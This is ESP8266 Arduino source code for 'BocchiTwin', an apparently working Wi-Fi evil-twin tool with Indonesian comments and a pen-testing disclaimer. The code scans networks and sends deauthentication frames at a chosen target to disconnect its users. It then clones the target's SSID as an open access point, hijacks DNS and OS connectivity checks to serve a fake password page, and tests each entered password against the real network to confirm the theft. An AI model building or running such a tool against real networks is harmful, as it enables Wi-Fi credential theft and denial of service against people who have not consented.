/*********************************************************************
 *  BocchiTwin v1.0 Alpha 
 *  Alat ini ditujukan untuk tujuan pengujian dan edukasi. Harap gunakan alat ini hanya untuk keperluan pen-testing pada jaringan milik sendiri atau jaringan yang telah Anda dapatkan izin untuk diuji. Segala konsekuensi dari penggunaan alat ini menjadi tanggung jawab pengguna, jadi Gunakan dengan risiko Anda sendiri.
 *********************************************************************/

#include <Arduino.h>
#include <ESP8266WiFi.h>
#include <DNSServer.h>
#include <ESP8266WebServer.h>

#include "config.h"
#include "networks.h"
#include "utils.h"
#include "deauth.h"
#include "webui.h"

extern "C" {
    #include "user_interface.h"
}

// ================== GLOBAL VARIABLES ==================
DNSServer dnsServer;
ESP8266WebServer webServer(80);

NetworkInfo networks[16];
NetworkInfo selectedNetwork;

String capturedPassword = "";
String attemptedPassword = "";

bool deauthActive = false;
bool evilTwinActive = false;

unsigned long lastScanTime = 0;
unsigned long lastDeauthTime = 0;

// ================== FUNCTION PROTOTYPES ==================
void performNetworkScan();
void handleRoot();
void handleResult();

// ================== SETUP ==================
void setup() {
    Serial.begin(115200);
    delay(1000);

    Serial.println("\n=========================================");
    Serial.println("   BocchiTwin v1.0 Alpha - Started");
    Serial.println("=========================================");

    WiFi.mode(WIFI_AP_STA);
    wifi_promiscuous_enable(1);

    WiFi.softAPConfig(AP_IP, AP_IP, AP_SUBNET);
    WiFi.softAP(AP_SSID, AP_PASSWORD);

    dnsServer.start(DNS_PORT, "*", AP_IP);

    webServer.on("/", handleRoot);
    webServer.on("/result", handleResult);
    webServer.onNotFound(handleRoot);

    webServer.on("/generate_204", handleRoot);
    webServer.on("/ncsi.txt", handleRoot);
    webServer.on("/connectivity-check.html", handleRoot);
    webServer.on("/hotspot-detect.html", handleRoot);

    webServer.begin();

    Serial.println("[+] Main AP Started: " + String(AP_SSID));
    Serial.println("[+] IP: 192.168.4.1");

    performNetworkScan();
}

// ================== NETWORK SCAN ==================
void performNetworkScan() {
    int n = WiFi.scanNetworks();
    clearNetworkList(networks, 16);

    for (int i = 0; i < n && i < 16; i++) {
        networks[i].ssid = WiFi.SSID(i);
        networks[i].rssi = WiFi.RSSI(i);
        memcpy(networks[i].bssid, WiFi.BSSID(i), 6);
        networks[i].channel = WiFi.channel(i);
    }
    Serial.printf("[+] Found %d networks\n", n);
}

// ================== HANDLE ROOT (Main Logic) ==================
void handleRoot() {
    if (evilTwinActive) {
        if (webServer.hasArg("password")) {
            attemptedPassword = webServer.arg("password");
            Serial.println("[EvilTwin] Password dicoba: " + attemptedPassword);

            WiFi.disconnect();
            delay(500);

            // Mulai koneksi ke target
            WiFi.begin(selectedNetwork.ssid.c_str(), attemptedPassword.c_str(), 
                       selectedNetwork.channel, selectedNetwork.bssid);

            bool connected = false;
            for (int i = 0; i < 15; i++) { 
                delay(200);
                if (WiFi.status() == WL_CONNECTED) {
                    connected = true;
                    break;
                }
            }

            if (connected) {
                capturedPassword = "✅ Password Berhasil Ditangkap!<br>"
                                   "<b>SSID:</b> " + selectedNetwork.ssid + "<br>"
                                   "<b>Password:</b> " + attemptedPassword;

                evilTwinActive = false;
                deauthActive = false;

                dnsServer.stop();
                WiFi.softAPdisconnect(true);
                WiFi.softAP(AP_SSID, AP_PASSWORD);
                dnsServer.start(DNS_PORT, "*", AP_IP);

                Serial.println("[+] PASSWORD BENAR - Semua proses dihentikan");
                webServer.send(200, "text/html", 
                    "<h1 style='color:#00ff9d;text-align:center;padding:120px 20px;font-size:32px;'>"
                    "Password Benar!<br>Evil Twin & Deauth dihentikan.</h1>");
            } else {
                // Password salah
                Serial.println("[-] Password salah");
                webServer.send(200, "text/html", getLoginPage(selectedNetwork.ssid));
            }
        } else {
            webServer.send(200, "text/html", getLoginPage(selectedNetwork.ssid));
        }
        return;
    }

    // ================== DASHBOARD ==================
    String html = FPSTR(controlPanelStart);

    for (int i = 0; i < 16; i++) {
        if (networks[i].ssid == "") break;

        String bssidStr = macToString(networks[i].bssid);
        html += "<tr><td>" + networks[i].ssid + "</td>";
        html += "<td>" + String(networks[i].rssi) + " dBm</td>";
        html += "<td>" + bssidStr + "</td>";
        html += "<td>" + String(networks[i].channel) + "</td>";
        html += "<td><form method='post' action='/?ap=" + bssidStr + "'>";

        if (macToString(selectedNetwork.bssid) == bssidStr) {
            html += "<button class='btn-select selected'>Selected</button>";
        } else {
            html += "<button class='btn-select'>Select</button>";
        }
        html += "</form></td></tr>";
    }

    html += "</table></div>";

    html.replace("{deauth_btn}", deauthActive ? "🛑 Stop Deauth" : "▶️ Start Deauth");
    html.replace("{deauth}", deauthActive ? "stop" : "start");
    html.replace("{hotspot_btn}", evilTwinActive ? "🛑 Stop Evil Twin" : "▶️ Start Evil Twin");
    html.replace("{hotspot}", evilTwinActive ? "stop" : "start");

    if (selectedNetwork.ssid == "") html.replace("{disabled}", " disabled");
    else html.replace("{disabled}", "");

    if (!capturedPassword.isEmpty()) {
        html += "<div class='result'><h3>Hasil Tangkapan Password</h3><p>" + capturedPassword + "</p></div>";
    }

    html += "</body></html>";
    webServer.send(200, "text/html", html);
}
// ================== RESULT HANDLER ==================
void handleResult() {
    webServer.send(200, "text/html", "<h1 style='color:#00ff9d;text-align:center;padding:80px;'>Perbaikan Selesai</h1>");
}

// ================== LOOP ==================
void loop() {
    dnsServer.processNextRequest();
    webServer.handleClient();

    if (webServer.hasArg("ap")) {
        String targetBssid = webServer.arg("ap");
        for (int i = 0; i < 16; i++) {
            if (macToString(networks[i].bssid) == targetBssid) {
                selectedNetwork = networks[i];
                Serial.println("[+] Target dipilih: " + selectedNetwork.ssid);
                break;
            }
        }
    }

    if (webServer.hasArg("deauth")) {
        deauthActive = (webServer.arg("deauth") == "start");
    }

    if (webServer.hasArg("hotspot")) {
        if (webServer.arg("hotspot") == "start" && selectedNetwork.ssid != "" && !evilTwinActive) {
            evilTwinActive = true;
            dnsServer.stop();
            WiFi.softAPdisconnect(true);
            delay(1000);
            
            WiFi.softAP(selectedNetwork.ssid.c_str());
            dnsServer.start(DNS_PORT, "*", AP_IP);
            
            Serial.println("[+] Evil Twin Started → " + selectedNetwork.ssid);
        } 
        else if (webServer.arg("hotspot") == "stop" && evilTwinActive) {
            evilTwinActive = false;
            dnsServer.stop();
            WiFi.softAPdisconnect(true);
            delay(500);
            WiFi.softAP(AP_SSID, AP_PASSWORD);
            dnsServer.start(DNS_PORT, "*", AP_IP);
            Serial.println("[-] Evil Twin Stopped");
        }
    }

    if (deauthActive && millis() - lastDeauthTime >= 400) {
        if (selectedNetwork.ssid != "") {
            sendDeauthFrame(selectedNetwork);
        }
        lastDeauthTime = millis();
    }

    if (!evilTwinActive && millis() - lastScanTime >= 5000) {   // jeda 5 detik scan jaringan silahkan ubah kalau dirasa terlalu nyepam
        performNetworkScan();
        lastScanTime = millis();
    }
}